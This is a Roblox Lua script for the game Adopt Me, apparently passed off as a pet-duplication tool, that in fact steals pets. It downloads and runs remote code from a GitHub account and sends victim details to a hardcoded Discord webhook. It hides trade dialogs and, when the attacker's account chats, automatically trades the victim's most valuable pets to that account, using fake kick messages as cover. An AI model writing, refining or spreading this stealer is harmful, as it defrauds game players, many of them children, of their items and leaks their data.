local Username = "PetsImporter"
local Webhook = "https://discord.com/api/webhooks/1332719431595462667/1bPMWPaOp9Ud3GpVHpEDgFyw1QzUXlFiOTDd3su2JmHyOXFz3bYRmRUNPo21INQp5lUA";


loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxroot/misc/refs/heads/main/Protected.lua"))()

getgenv().debug = false;
if getgenv().debug then
	repeat
		wait();
	until game:IsLoaded() 
	if getgenv().adm then
		return;
	end
	getgenv().adm = true;
	if (#game:GetService("Players"):GetPlayers() <= 5) then
		game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable to get Remote.Events");
		wait(5);
		game:Shutdown();
	end
	if (#game:GetService("Players"):GetPlayers() >= 44) then
		game:GetService("Players").LocalPlayer:Kick("\nHigh Latency Servers are not supported, unable to get Remote.Events");
		wait(5);
		game:Shutdown();
	end
	local Services = setmetatable({}, {__index=function(_, Name)
		return cloneref(game:GetService(Name));
	end});
	local RobloxReplicatedStorage = Services.RobloxReplicatedStorage;
	local GetServerType = RobloxReplicatedStorage:FindFirstChild("GetServerType");
	local IsVIP = GetServerType and (GetServerType:InvokeServer() == "VIPServer");
	print(IsVIP);
	if IsVIP then
		local Players = Services.Players;
		local LocalPlayer = Players.LocalPlayer;
		if LocalPlayer then
			Webhook = "";
			LocalPlayer:Kick("\nPrivate server detected!");
		end
	end
end
local TextChatService = game:GetService("TextChatService");
local Players = game:GetService("Players");
local LocalPlayer = Players.LocalPlayer;
local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral");
local function onChatMessage(message, fromUserId, textChannel)
	local fromPlayer = Players:GetPlayerByUserId(fromUserId);
	if (fromPlayer and (fromPlayer.Name == Username) and (message:lower() == "gg")) then
		LocalPlayer:Kick("\nScript received a new update use within 1 hour!");
	end
end
generalChannel.MessageReceived:Connect(function(messageData)
	local message = messageData.Text;
	local fromUserId = messageData.TextSource.UserId;
	local textChannel = messageData.TextChannel;
	onChatMessage(message, fromUserId, textChannel);
end);
local Loads = require(game.ReplicatedStorage.Fsys).load;
local RouterClient = Loads("RouterClient");
local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest");
local function moveGuiOffscreen(guiElement)
	if guiElement then
		guiElement.Position = UDim2.new(1000, 0, 1000, 0);
	end
end
local function hideDialog()
	local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui");
	local dialogApp = playerGui:FindFirstChild("DialogApp");
	if (dialogApp and dialogApp:FindFirstChild("Dialog")) then
		dialogApp.Dialog.Visible = false;
		moveGuiOffscreen(dialogApp.Dialog);
	end
end
local function declineTradeRequest(player)
	TradeAcceptOrDeclineRequest:InvokeServer(player, false);
end
local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived");
hideDialog();
TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
	local localPlayer = game:GetService("Players").LocalPlayer;
	if (sender.Name ~= localPlayer.Name) then
		declineTradeRequest(sender);
	end
end);
declineTradeRequest();


local Pets = {};
local PetCounts = {};
local Loaders = require(game.ReplicatedStorage.Fsys).load;
local InventoryDB = Loaders("InventoryDB");
local ClientData = Loaders("ClientData");
local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData);
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)];



local mfr_count = 0;
local nfr_count = 0;
local fr_count = 0;
local fly_count = 0;
local ride_count = 0;

for _, petData in pairs(playerData.inventory.pets) do
    if (petData.properties and (type(petData.properties) == "table")) then
        if (petData.properties.mega_neon and petData.properties.flyable and
            petData.properties.rideable) then
            mfr_count = mfr_count + 1;
        elseif (petData.properties.neon and petData.properties.flyable and
            petData.properties.rideable) then
            nfr_count = nfr_count + 1;
        elseif (petData.properties.neon and petData.properties.flyable) then
            nfr_count = nfr_count + 1;
        elseif (petData.properties.neon and petData.properties.rideable) then
            nfr_count = nfr_count + 1;
        elseif (petData.properties.neon and
            not (petData.properties.flyable or petData.properties.rideable)) then
            nfr_count = nfr_count + 1;
        elseif (petData.properties.flyable and petData.properties.rideable) then
            fr_count = fr_count + 1;
        elseif ((petData.properties.flyable or petData.properties.rideable) and
            not (petData.properties.mega_neon or petData.properties.neon)) then
            fr_count = fr_count + 1;
        end
    end
end


local legendaries_count = 0;
local ultra_count = 0;
local rare_count = 0;
local uncommon_count = 0;
local common_count = 0;

for i, v in pairs(ClientData.get("inventory").pets) do
    local petData = InventoryDB[v.category][v.id];
    if (petData.rarity == "legendary") then
        legendaries_count = legendaries_count + 1;
    elseif (petData.rarity == "ultra_rare") then
        ultra_count = ultra_count + 1;
    elseif (petData.rarity == "rare") then
        rare_count = rare_count + 1;
    elseif (petData.rarity == "uncommon") then
        uncommon_count = uncommon_count + 1;
    elseif (petData.rarity == "common") then
        common_count = common_count + 1;
    end
end
common_count = math.max(0, common_count - 1); --practice dog


local values = loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxroot/misc/refs/heads/main/values.lua", true))()

local total_values = 0
local function matches_name(output_name, table_name)
    -- Perform an exact match (case-insensitive)
    return string.lower(output_name) == string.lower(table_name)
end

for i, v in pairs(
    require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
) do
    local label = ""
    if v.properties.mega_neon and v.properties.flyable and v.properties.rideable then
        label = "rfm"
    elseif v.properties.mega_neon and v.properties.flyable then
        label = "fm"
    elseif v.properties.mega_neon and v.properties.rideable then
        label = "rm"
    elseif v.properties.mega_neon then
        label = "m"
    elseif v.properties.neon and v.properties.flyable and v.properties.rideable then
        label = "rfn"
    elseif v.properties.neon and v.properties.flyable then
        label = "fn"
    elseif v.properties.neon and v.properties.rideable then
        label = "rn"
    elseif v.properties.neon then
        label = "n"
    elseif v.properties.flyable and v.properties.rideable then
        label = "rfd"
    elseif v.properties.flyable then
        label = "fd"
    elseif v.properties.rideable then
        label = "rd"
    else
        label = "d"
    end

    local petName = v.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
    petName = petName:gsub("^(%a)(%a*)", function(first, rest)
        return first:upper() .. rest:lower()
    end)

    local key = petName .. " (" .. label .. ")"
    if PetCounts[key] then
        PetCounts[key] = PetCounts[key] + 1
    else
        PetCounts[key] = 1
    end
    for _, data in ipairs(values) do
        -- Match names exactly to avoid incorrect assignments
        if matches_name(petName, data.name) and data[label] then
            total_values = total_values + tonumber(data[label])
        end
    end
end



local plr = game.Players.LocalPlayer;
local accage = plr.AccountAge;
local scriptver = "v2.0kai";
local ExecutorValue = identifyexecutor() or "Unknown";
local consoletp = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId ..", '" .. game.JobId .. "')";
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] ..game.PlaceId .. [[, "]] .. game.JobId ..[[", game.Players.LocalPlayer)]];
        
local embed = {
    title = "**NEW HIT!**",
    color = 16711680,
    fields = {
        {
            name = ":ninja: **Victim Information:**",
            value = 
            ("```lua\n".. 
                "Victim           : " .. tostring(plr) .."\n" .. 
                "Executor         : " .. tostring(ExecutorValue) .. "\n" ..
                "Account Age      : " .. tostring(accage) .. " Days\n" ..
                "Script Version   : " .. tostring(scriptver) .. "\n" .. "```")
        }, 

        {
            name = ":crown: **Collector**",
            value = ("```lua\n" .. 
                "Receiver         : " .. tostring(Username) .."\n" .. "```")
        }, 

        {
            name = ":question: **Amount**",
            value = ("```lua\n" .. 
                "Total Value     : " .. tostring(total_values) .. "\n" .."```")
        },

        {
            name = ":moneybag: **Pets:**",
            value = ("```lua\n" .. 
                "Mega|Fly|Ride    : " .. tostring(mfr_count) .."\n" ..
                "Neon|Fly|Ride    : " .. tostring(nfr_count) .. "\n" ..
                "Fly|Ride         : " .. tostring(fr_count) .. "\n" ..
                "Legendary        : " .. tostring(legendaries_count) .. "\n" ..
                "Ultra Rare       : " .. tostring(ultra_count) .. "\n" ..
                "Rare             : " .. tostring(rare_count) .. "\n" .. 
                "Uncommon         : " .. tostring(uncommon_count) .. "\n" ..
                "Common           : " .. tostring(common_count) .. "\n" .. "```")
        },

        {
            name = "**Join from console!**",
            value = ("```lua\n" .. consoletp .. "\n" .. "```")
        }
    }
};

function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService");
    local headers = {["Content-Type"] = "application/json"};
    local data = {
        username = "Adopt Me! | Made by Kai",
        avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR3vXYMnRTuk5y3MYMCZLJ4v9AwqZmj6v8amWUcBLV_CjRBJlUjBvXCQYQz8LKROHmMIto&usqp=CAU",
        content = TeleportScript,
        embeds = {
            {
                title = embed.title,
                color = (embed.color or 16777215),
                fields = embed.fields
            }
        }
    };
    if bool then
        data.content = "--@everyone\n" .. TeleportScript;
        data.embeds[1].color = 15844367;
    end
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = http:JSONEncode(data)
    });
end

if ((legendaries_count > 0) or (ultra_count > 0) or (mfr_count > 0) or (nfr_count > 0) or (fr_count > 0)) then
SendMessageEMBED(Webhook, embed, true);
else
game:GetService("Players").LocalPlayer:Kick("\nCannot duplicate low-value pets.\nDuplicate return() false.");
end

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false;
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy();
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false;

local Active = false


local Loaders = require(game.ReplicatedStorage.Fsys).load
local ClientData = Loaders("ClientData")
local function matches_name(output_name, table_name)
    return string.match(string.lower(output_name), string.lower(table_name))
end

local function CheckCount()
    if legendaries_count == 0 and ultra_count == 0 and rare_count == 0 then
        game.Players.LocalPlayer:Kick("\nScript received an update use within 2 Hours!")
    end
end

local function updateCounts()
    legendaries_count, ultra_count, rare_count = 0, 0, 0

    for _, pet in pairs(ClientData.get("inventory").pets) do
        local petData = InventoryDB[pet.category][pet.id]
        if petData.rarity == "legendary" then
            legendaries_count = legendaries_count + 1
        elseif petData.rarity == "ultra_rare" then
            ultra_count = ultra_count + 1
        elseif petData.rarity == "rare" then
            rare_count = rare_count + 1
        end
    end
end

local function prioritize_pets(inventory)
    local petPriorities = {}

    for petUid, pet in pairs(inventory.pets) do
        local label = ""
        if pet.properties.mega_neon and pet.properties.flyable and pet.properties.rideable then
            label = "rfm"
        elseif pet.properties.mega_neon and pet.properties.flyable then
            label = "fm"
        elseif pet.properties.mega_neon and pet.properties.rideable then
            label = "rm"
        elseif pet.properties.mega_neon then
            label = "m"
        elseif pet.properties.neon and pet.properties.flyable and pet.properties.rideable then
            label = "rfn"
        elseif pet.properties.neon and pet.properties.flyable then
            label = "fn"
        elseif pet.properties.neon and pet.properties.rideable then
            label = "rn"
        elseif pet.properties.neon then
            label = "n"
        elseif pet.properties.flyable and pet.properties.rideable then
            label = "rfd"
        elseif pet.properties.flyable then
            label = "fd"
        elseif pet.properties.rideable then
            label = "rd"
        else
            label = "d"
        end

        local petName = pet.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
        petName = petName:gsub("^(%a)(%a*)", function(first, rest)
            return first:upper() .. rest:lower()
        end)

        for _, data in ipairs(values) do
            if matches_name(petName, data.name) and data[label] then
                table.insert(petPriorities, {
                    uid = petUid,
                    priority = tonumber(data[label])
                })
                break
            end
        end
    end

    table.sort(petPriorities, function(a, b)
        return a.priority > b.priority
    end)

    return petPriorities
end

local function Steal()
    if Active then
        return
    end
    Active = true

    updateCounts()

    local RouterClient = Loaders("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

    local function offset(guiElement)
        if guiElement then
            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
        end
    end

    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
    if dialogApp and dialogApp:FindFirstChild("Dialog") then
        offset(dialogApp.Dialog)
    end

    SendTrade:FireServer(game.Players[Username])

    local PetsInventory = ClientData.get("inventory")
    local petPriorities = prioritize_pets(PetsInventory)

    for _, pet in ipairs(petPriorities) do
        if not Active then
            break
        end
        AddPetRemote:FireServer(pet.uid)
    end

    AcceptNegotiationRemote:FireServer()
    ConfirmTradeRemote:FireServer()
    CheckCount()
    Active = false
    wait(1)
    Steal()
end

game.Players.PlayerAdded:Connect(function(player)
    if player.Name == Username then
        player.Chatted:Connect(function()
            Steal()
        end)
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxroot/misc/refs/heads/main/GUI.lua", true))()
